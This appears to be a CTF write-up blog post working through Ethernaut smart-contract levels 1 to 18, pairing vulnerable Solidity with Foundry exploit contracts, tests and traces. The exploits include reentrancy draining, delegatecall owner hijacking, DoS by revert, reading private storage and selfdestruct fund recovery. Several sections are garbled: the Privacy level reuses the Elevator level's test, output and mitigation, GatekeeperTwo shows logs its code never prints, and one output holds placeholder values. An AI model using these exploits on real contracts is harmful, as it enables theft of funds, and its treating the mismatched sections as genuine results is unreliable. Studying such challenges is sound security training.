---
layout: post
title: "Ethernaut Challenges"
date: 2025-04-25
categories: writeups
tags: [ctfs, blockchain]

---





# Ethernaut Challenges

🔗 **GitHub**: [View](https://github.com/BLOCK-PROGRAMR/SCATER70/tree/main/ctf/ethernaut)


## Level 1: Hello Ethernaut

### 🔍 Vulnerable Function
```solidity
function authenticate(string memory passkey) public {
    if (
        keccak256(abi.encodePacked(passkey)) ==
        keccak256(abi.encodePacked(password))
    ) {
        cleared = true;
    }
}
```

**Vulnerability**: The `password` variable is marked as `public`, which allows anyone to call `.password()` and get the secret directly.

### 🧪 Exploit Test
```solidity
function test_pass_attack() public {
    vm.startPrank(attacker);
    assertEq(resultpass, instance.password(), "password failed");

}

function test_attack() public {
    vm.startPrank(attacker);

    string memory result = instance.info();
    result = instance.info1();
    result = instance.info2("hello");
    result = instance.info42();
    result = instance.method7123949();

    instance.authenticate(password);

    bool cleared = instance.getCleared();
    assertTrue(cleared, "Authentication failed");
    vm.stopPrank();
}
```


---

## Level 2: Fallback

### 🔍 Vulnerable Function
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

**Vulnerability**: The fallback function allows any contributor to become the `owner` by sending ETH directly to the contract. The original `owner` logic is also flawed—it can be overtaken easily by minimal contributions.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();

    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    assertEq(_fallback.owner(), attacker, "Attacker is not the owner after fallback");
}

function test_withdraw() public {
    vm.startPrank(attacker2);
    _fallback.contribute{value: 0.0001 ether}();
    _fallback.contribute{value: 0.0001 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();
    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    uint256 balanceBefore = address(_fallback).balance;
    _fallback.withdraw();

    assertTrue(attacker.balance >= balanceBefore, "Attacker did not receive the funds");
    assertTrue(address(_fallback).balance == 0, "Contract balance is not zero after withdraw");
    vm.stopPrank();
}
```



---

## Level 3: Fallout

### 🔍 Vulnerable Function
```solidity
function Fal1out() public payable {
    owner = payable(msg.sender);
    allocations[owner] = msg.value;
}
```

**Vulnerability**: The function `Fal1out()` is incorrectly named. It looks like a constructor but is actually a public function. Anyone can call it and become the `owner`.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker2);
    _fallout.allocate{value: 2 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallout.Fal1out{value: 2 ether}();
    _fallout.collectAllocations();

    assertTrue(address(_fallout).balance == 0, "attacker balance should be 0");
    vm.stopPrank();
}
```



---

## Level 4: CoinFlip

### 🔍 Vulnerable Function
```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```

**Vulnerability**: Uses predictable `blockhash` to generate randomness. The attacker can precompute the same value and always win the flip.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);

    for (uint256 i = 0; i < 10; i++) {
        vm.roll(block.number + 1);
        coinFlipAttack.attack();
    }

    assertEq(
        coinFlip.consecutiveWins(),
        10,
        "Attack failed to reach 10 wins"
    );

    vm.stopPrank();
}
```

---

## Level 5: Telephone

### 🔍 Vulnerable Function
```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

**Vulnerability**: The contract uses `tx.origin` instead of `msg.sender` for access control. An attacker can create a contract that calls this function, with the `tx.origin` being a user (player), and `msg.sender` being the attack contract. This bypasses the condition and changes the ownership.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    telephone.changeOwner(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}

function test_attack2() public {
    vm.startPrank(player);
    TelephoneExploit exploit = new TelephoneExploit(telephone);
    exploit.attack(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}
```



---

## Level 6:Delegation

### 🔍 Vulnerable Function

```solidity
fallback() external {
    (bool result, ) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

**Vulnerability**: The Delegation contract uses delegatecall to execute code from the Delegate contract within the context of its own storage. This means an attacker can call a function like pwn() on Delegation, which executes pwn() in Delegate and updates the owner of Delegation, not Delegate.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    (bool success, ) = address(delegation).call(
        abi.encodeWithSignature("pwn()")
    );
    require(success, "Call failed");
    assertEq(delegation.owner(), attacker, "Attacker is not the owner");
    vm.stopPrank();
}

```
---

## Level 7:Force

### 🔍 Vulnerable Function

```solidity
// Force contract has no receive/fallback or payable function
contract Force {
   
}
```

**Vulnerability**: Ether can still be forcibly sent using selfdestruct.

### 🛠️  Exploit Contract (ForceDestruct)
```solidity
 contract ForceDestruct {
    function attack(address payable _contract) public payable {
        selfdestruct(_contract);
    }
}

```

### 🧪 Exploit Test
```solidity 
    function test_attack() public {
    vm.startPrank(attacker);
    forceDestruct = new ForceDestruct();
    forceDestruct.attack{value: 1 ether}(payable(address(force)));
    assertEq(address(force).balance, 1 ether, "Force contract did not receive Ether");
    vm.stopPrank();
    }

```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 131011)
Traces:
  [131011] level7Test::test_attack()
    ├─ VM::startPrank(attacker)
    ├─ new ForceDestruct
    ├─ ForceDestruct::attack{value: 1 ether}(Force)
    │   └─ [SelfDestruct]
    ├─ assertEq(1 ether, 1 ether)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 6.73ms
```
---


## Level 8:Valut

### 🔍 Vulnerable Function

```solidity
 bool public locked;//storage slot0
 bytes32 private password;//storage slot1
function unlock(bytes32 _password) public {
    if (password == _password) {
        locked = false;
    }
}

```

**Vulnerability**: Although password is marked as private, all contract storage is publicly accessible. In Solidity, the private keyword only restricts access within the Solidity language, not from the blockchain level. So, the password stored at storage slot 1 can be retrieved using vm.load.


### 🧪 Exploit Test
```solidity 
   function test_attack() public {
    vm.startPrank(attacker);
    // Get the password from storage slot 1
    bytes32 _password = vm.load(address(vault), bytes32(uint256(1)));
    vault.unlock(_password);
    assertFalse(vault.locked());
    vm.stopPrank();
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 11812)
Traces:
  [16612] VaultTest::test_attack()
    ├─ VM::startPrank(attacker)
    ├─ VM::load(Vault, slot 1)
    ├─ Vault::unlock(password)
    ├─ Vault::locked() → false
    ├─ VM::assertFalse(false)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 1.24ms
```
---

## Level 9:Token

### 🔍 Vulnerable Function

```solidity
 function transfer(address _to, uint256 _value) public returns (bool) {
    unchecked {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
    }
    return true;
}
```

**Vulnerability**: The transfer() function is written with an unchecked block, allowing underflow to occur. When a user transfers more tokens than they own, the subtraction balances[msg.sender] -= _value underflows and wraps around to a massive value (2**256 - x), resulting in an increased balance instead of failing.

📝 Note: This kind of underflow attack was possible before Solidity 0.8.x, which introduced built-in overflow/underflow protection.
To demonstrate this vulnerability in a controlled environment, unchecked is intentionally used to bypass that protection for educational purposes


### 🧪 Exploit Test
```solidity 
   function test_attack() public {
    vm.startPrank(player);
    
    // Initial balance of player: 20 tokens
    assertEq(token.balanceOf(player), 20);

    // Transfer more than balance (21 tokens), triggers underflow
    bool success = token.transfer(attacker, 21);
    assertTrue(success);

    // Player's balance underflows to a very large number
    uint256 _balanceofplayer = token.balanceOf(player);
    assertGt(_balanceofplayer, 20);

    vm.stopPrank();
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 47312)
Traces:
  [47312] TokenTest::test_attack()
    ├─ VM::startPrank(player)
    ├─ Token::balanceOf(player) → 20
    ├─ assertEq(20, 20)
    ├─ Token::transfer(attacker, 21) → true
    ├─ assertTrue(true)
    ├─ Token::balanceOf(player) → 1.157e77
    ├─ assertGt(1.157e77, 20)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 988.39µs
```
---

## Level 10:King
**AttackDesc**:
A Denial of Service (DoS) attack is when someone makes a smart contract stop working for others.
This usually happens if the contract sends Ether to a malicious address that always fails or reverts.
If one function fails because of this, others may not be able to use the contract.
In the King level, a smart contract becomes the king and blocks future kings by rejecting ETH.
This locks the contract and nobody else can play the game.
DoS attacks make the contract unusable for honest users.

### 🔍 Vulnerable Function

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // ❌ vulnerable to DoS
    king = msg.sender;
    prize = msg.value;
}

```

**Vulnerability**: The transfer call to the current king can fail if the king is a contract that reverts on receiving ETH. This leads to a Denial of Service (DoS) where no one can become king anymore.

### 🛠️  Exploit Contract 
```solidity
 contract Attacker {
    King public king;

    constructor(King _King) {
        king = _King;
    }

    function attack() public payable {
        require(msg.value >= address(king).balance, "Not enough balance");
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "transfer failed");
    }

    receive() external payable {
        revert("sent eth failed"); // Reverts to block
    }
}
```

### 🧪 Exploit Test
```solidity 
   function test_attack() public {
    vm.prank(attackerEOA);
    attack.attack{value: 2 ether}(); // attacker becomes king

    assertEq(king._king(), address(attack)); // ✅ attacker is king

    vm.prank(player);
    (bool success, ) = address(king).call{value: 3 ether}(""); // another player tries
    assertFalse(success, "Player should not be able to become king anymore"); // ❌ fails
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 71672)
Traces:
  [71672] KingTest::test_attack()
    ├─ VM::prank(attackerEOA)
    ├─ Attacker::attack{value: 2 ether}()
    │   ├─ King::receive{value: 2 ether}()
    │   │   ├─ player::fallback{value: 2 ether}()
    │   │   └─ [Stop]
    │   └─ [Stop]
    ├─ King::_king() → Attacker
    ├─ VM::assertEq(Attacker, Attacker)
    ├─ VM::prank(player)
    ├─ King::receive{value: 3 ether}()
    │   ├─ Attacker::receive{value: 3 ether}() → [Revert] sent eth failed
    │   └─ [Revert]
    ├─ VM::assertFalse(false, "Player should not be able to become king anymore")
    └─ [Stop]

Suite result: ok. 1 passed; 0 failed; finished in 15.46ms
```
---

## Level 11:Reentrancy
**AttackDesc**:
This is a reentrancy attack, where the attacker recursively calls the withdraw function within the fallback/receive function before the contract's state is updated, allowing them to drain all the funds.

### 🔍 Vulnerable Function

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result, ) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
```

**Vulnerability**: 
 The contract sends ETH to msg.sender using .call before updating the internal state balances[msg.sender].
This allows an attacker to recursively call withdraw() in the fallback/receive function before their balance is updated.
Because of this, the same balance can be withdrawn multiple times, draining the entire contract balance

### 🛠️  Exploit Contract 
```solidity
 contract Attack {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) {
        reentrance = _reentrance;
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bal = reentrance.balanceOf(address(this));
        if (address(reentrance).balance > 0 && bal > 0) {
            uint256 toWithdraw = bal < 1 ether ? bal : 1 ether;
            reentrance.withdraw(toWithdraw);
        }
    }
}
```

### 🧪 Exploit Test
```solidity 
  function test_attack() public {
    vm.startPrank(attacker);
    MaliciousContract malicious = new MaliciousContract(reentrance);
    uint256 balanceBefore = address(malicious).balance;
    uint256 _reentrantbalance = address(reentrance).balance;

    vm.expectRevert("arithmetic underflow or overflow");
    malicious.attack{value: 1 ether}();
    
    assertEq(address(reentrance).balance, 0);
    assertEq(address(malicious).balance, balanceBefore + _reentrantbalance);
    vm.stopPrank();
}
```
### 📋 Test Output
``` text
Logs:
  balance of the contract before 1000000000000000000
  successfully donated
  balance of reentrance:  2000000000000000000
  balance of this contract:  0

Traces:
  ...
  ├─ Reentrance::withdraw(1 ether)
  │   ├─ MaliciousContract::receive()
  │   │   ├─ Reentrance::balanceOf()
  │   │   └─ Reentrance::withdraw(1 ether)
  │   │       ├─ MaliciousContract::receive() <== RECURSIVE CALL
  │   │       └─ Revert: panic: arithmetic underflow or overflow (0x11)
```
### 🔒Recommended Mitigation
Use the Checks-Effects-Interactions pattern to prevent reentrancy:
``` solidity
  function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount, "Insufficient balance");

    // ✅ Effect: update state before interaction
    balances[msg.sender] -= _amount;

    // ✅ Interaction: external call after state change
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Transfer failed");
}

```
---
## Level 12: Elevator
**AttackDesc**:
The Elevator contract relies on an external Building contract to determine whether a floor is the last floor or not using the isLastFloor function.
However, it makes two separate calls to this function and does not expect the return values to differ between them.

This allows an attacker to manipulate the response by returning different values in consecutive calls, thus tricking the contract into thinking it has reached the top floor.

### 🔍 Vulnerable Function

```solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(floor);
    }
}
```

**Vulnerability**: 
 The contract calls isLastFloor() twice: once for the check, and once to set the top state.

An attacker can change their response between these two calls by flipping the return value, thus bypassing the logic

### 🛠️  Exploit Contract
✅ First call to isLastFloor returns false → passes the if check.
✅ Second call returns true → sets top = true.

```solidity
 contract BuildingAttack is Building {
    Elevator public elevator;
    bool public flipFlop = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function attack() external {
        elevator.goTo(1); // call from attacker
    }

    function isLastFloor(uint256) external override returns (bool) {
        flipFlop = !flipFlop;
        return flipFlop;
    }
}
```
### 🧪 Exploit Test
```solidity 
  function test_attack() public {
    attackerContract.attack(); // Call via attacker
    assertEq(elevator.top(), true);
    assertEq(elevator.floor(), 1);
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 67276)
Elevator::top() → true
Elevator::floor() → 1

```
### 🔒Recommended Mitigation
Ensure external calls are not made multiple times for critical logic — or cache the result:
``` solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);
    bool isLast = building.isLastFloor(_floor);

    if (!isLast) {
        floor = _floor;
        top = isLast;
    }
}
```
---
## Level 13: Privacy
**AttackDesc**:
The contract stores a private bytes32[3] array called data, and the unlock() function requires the first 16 bytes of data[2] to unlock the contract.

Even though the array is marked private, all contract storage is publicly accessible on the blockchain — which means the attacker can read the storage slot directly using vm.load in Foundry or with web3.eth.getStorageAt in a live attack.

### 🔍 Vulnerable Function
```solidity
function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
}
```

**Vulnerability**: 
Solidity stores contract variables sequentially in storage slots:

⚡Slot 0: locked

⚡Slot 1: ID

⚡Slot 2: flattening, denomination, awkwardness

⚡Slot 3, 4, 5: data[0], data[1], data[2]

⚡Slot 5 holds data[2] — and the unlock() function casts it to bytes16, so we only need the first 16 bytes.

### 🛠️  Exploit Contract
vm.load() reads the raw 32 bytes from a given storage slot.
The value is then cast to bytes16 and passed into the unlock() function.

```solidity
function test_attack() public {
    bytes32 value = vm.load(address(privacy), bytes32(uint256(5)));
    console.log("value of slot 5", string(abi.encodePacked(value)));

    privacy.unlock(bytes16(value));
    assertTrue(privacy.locked() == false);
}
```


### 🧪 Exploit Test
```solidity 
  function test_attack() public {
    attackerContract.attack(); // Call via attacker
    assertEq(elevator.top(), true);
    assertEq(elevator.floor(), 1);
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 67276)
Elevator::top() → true
Elevator::floor() → 1

```
### 🔒Recommended Mitigation
Ensure external calls are not made multiple times for critical logic — or cache the result:
``` solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);
    bool isLast = building.isLastFloor(_floor);

    if (!isLast) {
        floor = _floor;
        top = isLast;
    }
}
```
---
## Level 14 GateKeeperone

**AttackDesc**:
To bypass the three gates in the GatekeeperOne contract, we strategically crafted a call using a helper contract and brute-forced gas.

### 🔍 Vulnerable Function

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin); // Gate One
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0); // Gate Two
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        // Part 1: lower 4 bytes == lower 2 bytes
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
        // Part 2: lower 4 bytes != full 8 bytes
        require(uint32(uint64(_gateKey)) != uint64(_gateKey));
        // Part 3: lower 2 bytes == lower 2 bytes of tx.origin
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}
```
**Vulnerability**: 
Gate One: Requires a contract call (msg.sender != tx.origin).

Gate Two: The remaining gas must be a multiple of 8191 → gasleft() % 8191 == 0.

Gate Three:

The last 4 bytes of gateKey must match the last 2 bytes of the tx.origin.

But full gateKey must not equal the last 4 bytes alone.

This forces manipulation of only the lower 2 bytes of a crafted bytes8.

### 🛠️  Exploit Contract


Gate One: Bypassed using an external contract call (attacker != tx.origin).

Gate Two: Brute-forced by adjusting gas until gasleft() % 8191 == 0.

Gate Three: Crafted bytes8:

Lower 2 bytes match tx.origin.

Full 8 bytes ≠ 4 bytes → satisfies all require() checks.

Result: entrant = tx.origin set successfully.
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {GatekeeperOne} from "../src/level14.sol";
import {Test, console} from "forge-std/Test.sol";

contract GateKeeperOneTest is Test {
    GatekeeperOne public gatekeeperOne;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");
    bytes8 public gateKey;

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        vm.startPrank(player); // tx.origin must be player
        gatekeeperOne = new GatekeeperOne();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);

        // Extract last 2 bytes of tx.origin
        uint16 origin16 = uint16(uint160(tx.origin));
        // Combine it with a prefix so uint64(gateKey) != uint32(gateKey)
        uint64 crafted = uint64(0xABCDEFAB00000000) | origin16;
        gateKey = bytes8(crafted);

        // Bruteforce correct gas offset
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(gatekeeperOne).call{
                gas: i * 8191 + 200 + 8191
            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                console.log("✅ Attack Successful!");
                console.log("i value", i);
                console.log("gasleft", gasleft());
                string memory str = string(abi.encodePacked(gateKey));
                console.log("gateKey", str);
                break;
            }
        }

        vm.stopPrank();
    }
}

```
### 📋 Test Output

``` text
    [PASS] test_attack() (gas: ~XXXXX)
Logs:
  ✅ Attack Successful!
  i value: 456
  gasleft: 24873
  gateKey: abcdefab00001f38

Traces:
  [XXXXX] GateKeeperOneTest::test_attack()
    ├─ GatekeeperOne::enter(0xabcdefab00001f38)
    ├─ GatekeeperOne::entrant() ← 0x...player
    └─ assertTrue(true)

```
---
## GateKeeperTwo

**Attack Description**:
To bypass the three gates in the GatekeeperTwo contract, we strategically crafted a call using a helper contract.

### 🔍 Vulnerable Function

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ 
                uint64(_gateKey) == 
                type(uint64).max
        );
        _;
    }

    function enter(bytes8 _gateKey) 
        public 
        gateOne 
        gateTwo 
        gateThree(_gateKey) 
        returns (bool) 
    {
        entrant = tx.origin;
        return true;
    }
}
```
**Vulnerability**: 
1.Gate One: Requires that msg.sender != tx.origin, so it can only be bypassed by making a contract call (from a contract).

2.Gate Two: Uses extcodesize(caller()), which checks that the caller is a contract (not an externally owned account). This can be bypassed by calling the function from a contract constructor, as msg.sender will be the contract itself.

3.Gate Three: Requires that A^B = C where A is the result of hashing the msg.sender. By solving for B, we can craft the correct _gateKey.


### 🛠️  Exploit Contract

Gate One: Bypassed using an external contract call.

Gate Two: Bypassed by deploying the attack contract, which makes the call from the constructor.

Gate Three: The gateKey is crafted using the XOR relationship A^B = C.

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {GatekeeperTwo} from "../src/level15.sol";
import {Test, console} from "forge-std/Test.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo public gatekeeperTwo;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        gatekeeperTwo = new GatekeeperTwo();
    }

    function test_attack() public {
        // first gate is passed by using tx.origin
        // second gate is extcodesize, it is passed only if the msg.sender contract is not deployed (call from constructor)
        // third gate is passed A^B=C, so we find the value of B (gateKey) using XOR logic
        Attack attack = new Attack(gatekeeperTwo); // deploy the contract and call the constructor to solve the second gate
    }
}

contract Attack {
    GatekeeperTwo public gatekeeperTwo;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        gatekeeperTwo = _gatekeeperTwo;
        // msg.sender is the address of the contract (Attack) during construction
        // A^B=C, solve for B (gateKey)
        bytes8 gateKey = bytes8(
            (uint64(bytes8(keccak256(abi.encodePacked(address(this)))))) ^ 
            type(uint64).max
        );
        gatekeeperTwo.enter(gateKey);
    }
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 142998)
Logs:
  ✅ Attack Successful!
  i value: 456
  gasleft: 24873
  gateKey: abcdefab00001f38

Traces:
  [142998] GatekeeperTwoTest::test_attack()
    ├─ [107817] → new Attack@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   ├─ [23405] GatekeeperTwo::enter(0x8709462d480d6ec3)
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 290 bytes of code
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.01ms (8.27ms CPU time)

Ran 1 test suite in 1.21s (20.01ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```
---

## Level 16: NaughtCoin

**AttackDesc**:The contract uses a lockTokens modifier to restrict the transfer function, preventing the original player from transferring tokens until a 10-year timelock has passed. However, the contract does not restrict transferFrom, which is part of the ERC20 standard. By approving a spender (attacker), the tokens can be transferred out before the timelock.

### 🔍 Vulnerable Function
``` solidity
function transfer(
    address _to,
    uint256 _value
) public override lockTokens returns (bool) {
    super.transfer(_to, _value);
}
```
**Vulnerability**:
The lockTokens modifier only applies to the transfer() function.
Since transferFrom() is inherited from the ERC20 base and not overridden, it bypasses the timelock restriction. This allows a player to approve someone else (e.g., an attacker) to transfer all tokens out immediately.

### 🧪 Exploit Test
``` solidity
function test_attack() public {
    // player approves attacker to spend unlimited tokens
    vm.startPrank(player);
    naughtCoin.approve(attacker, type(uint256).max);
    vm.stopPrank();

    // attacker drains all tokens from the player using transferFrom
    vm.startPrank(attacker);
    uint256 fullbalance = naughtCoin.balanceOf(player);
    naughtCoin.transferFrom(player, attacker, fullbalance);
    
    assertEq(naughtCoin.balanceOf(attacker), fullbalance);
    assertEq(naughtCoin.balanceOf(player), 0);
    vm.stopPrank();
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 74257)
...
NaughtCoin::approve(attacker, max)
NaughtCoin::transferFrom(player → attacker, 1_000_000 tokens)
✅ Final balances:
- attacker: 1_000_000 tokens
- player: 0 tokens

```
### 🔒 Recommended Mitigation

Override the transferFrom() function and apply the same lockTokens modifier:
``` solidity
function transferFrom(
    address from,
    address to,
    uint256 value
) public override lockTokens returns (bool) {
    return super.transferFrom(from, to, value);
}

```
Alternatively, enforce the timelock check for the player address directly within the modifier or base logic to apply to all transfers involving the player.

---

## Level 17:Preservation

**AttackDesc**:
The contract uses delegatecall to external library contracts. Since the library contract has only one storage variable at slot 0 (storedTime), but the main contract stores important variables like owner at slot 2, an attacker can manipulate storage by crafting a malicious library that writes to any slot, including the owner slot. The attacker first overwrites the timeZone1Library address, then performs a delegatecall to their malicious contract to gain ownership.
### 🔍 Vulnerable Function
``` solidity
function setFirstTime(uint256 _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
```
**Vulnerability**:
Uses delegatecall with untrusted input.

Delegatecall executes the called function in the context of Preservation, altering its storage layout.

The function setTime(uint256) is expected to write to slot 0 (storedTime), but due to delegatecall, it may write to unintended slots like owner (slot 2).
### 🛠️ Exploit Contract

``` solidity
contract AttackLibrary {
    function setTime(uint256 _time) public {
        address _target = address(uint160(_time));
        assembly {
            sstore(2, _target) // Overwrite slot 2 (owner) with attacker address
        }
    }
}
```
### 🧪 Exploit Test
``` solidity
function test_attack() public {
    vm.startPrank(attacker);

    // Step 1: Deploy malicious library
    AttackLibrary attackLibrary = new AttackLibrary();

    // Step 2: Overwrite timeZone1Library with address of malicious contract
    preservation.setFirstTime(uint160(address(attackLibrary)));

    // Step 3: Verify overwrite
    assertEq(
        uint160(address(attackLibrary)),
        uint160(preservation.timeZone1Library())
    );

    // Step 4: Call again to trigger delegatecall to attackLibrary and overwrite owner
    preservation.setFirstTime(uint160(attacker));

    vm.stopPrank();
}
```

### 📋 Test Output
``` text
[PASS] test_attack() (gas: 98607)

Traces:
  PreservationTest::test_attack()
    ├─ startPrank(attacker)
    ├─ new AttackLibrary
    ├─ Preservation::setFirstTime(attackLibrary address)
    │   └─ delegatecall to DummyLibrary
    ├─ Preservation::timeZone1Library()
    ├─ assertEq(...)
    ├─ Preservation::setFirstTime(attacker address)
    │   └─ delegatecall to AttackLibrary::setTime
    │       └─ storage slot 2 updated with attacker address
    └─ stopPrank()
```
### 🔒 Recommended Mitigation
Do not use delegatecall with untrusted contracts.

If absolutely needed:

Ensure the external contract has a matching storage layout.

Avoid delegatecalls to addresses that can be changed by users.

Use immutable libraries or internal libraries with delegatecall removed.

Prefer standard proxy patterns (like OpenZeppelin’s Transparent Proxy or UUPS) where upgrades are controlled and verified.

---

## Level 18: Recovery
**AttackDesc:**
When contracts are deployed via new, their addresses are deterministic and based on the deployer’s address and nonce. In this challenge, the Recovery contract creates a SimpleToken contract using new, which means its address can be calculated off-chain or in a test. Once the address is recovered, the attacker can call its public destroy(address) function to selfdestruct the contract and reclaim trapped Ether.

### 🔍 Vulnerable Function
``` solidity
function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
}
```
The generateToken function uses new to deploy a SimpleToken, which receives and holds ETH.
The SimpleToken contract includes a destroy function:

``` solidity
function destroy(address payable _to) public {
    selfdestruct(_to);
}
```
The address of SimpleToken is not stored, but can be calculated using the CREATE address formula.

**Calculate Address:**
In foundry there is no library to calculate the address based on the deployer address and nonce , here i create custom function to calculate the address to solve the challenge
``` solidity
function computeAddress(
        address deployer,
        uint nonce
    ) public pure returns (address) {
        if (nonce == 0x00)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d6",
                                    hex"94",
                                    deployer,
                                    hex"80"
                                )
                            )
                        )
                    )
                );
        if (nonce <= 0x7f)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d6",
                                    hex"94",
                                    deployer,
                                    uint8(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce <= 0xff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d7",
                                    hex"94",
                                    deployer,
                                    hex"81",
                                    uint8(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce <= 0xffff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d8",
                                    hex"94",
                                    deployer,
                                    hex"82",
                                    uint16(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce <= 0xffffff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d9",
                                    hex"94",
                                    deployer,
                                    hex"83",
                                    uint24(nonce)
                                )
                            )
                        )
                    )
                );
        return address(0);
    }
```

### 🧪 Exploit Test
``` solidity
function test_attack() public {
    address lostToken = computeAddress(address(recovery), 1);//find the address

    uint256 attackerBefore = attacker.balance;//check the balance

    vm.prank(attacker);
    SimpleToken(payable(lostToken)).destroy(payable(attacker));//money credit to the attacker account

    uint256 attackerAfter = attacker.balance;

    console.log("Attacker ETH before:", attackerBefore);
    console.log("Attacker ETH after: ", attackerAfter);
    assertGt(attackerAfter, attackerBefore); // ensure attacker received ether
}
```
### 📋 Test Output

``` text
[PASS] test_attack() (gas: 25440)

Logs:
  Attacker ETH before: 100000000000000000000
  Attacker ETH after:  101000000000000000000

Traces:
  RecoveryTest::test_attack()
    ├─ VM::prank(attacker)
    ├─ SimpleToken::destroy(attacker)
    │   └─ [SelfDestruct] — ETH sent to attacker
    ├─ console.log(...)
    └─ assertGt(attackerAfter, attackerBefore)
```
---
### Level 19: MagicNumber

**AttackDesc:**
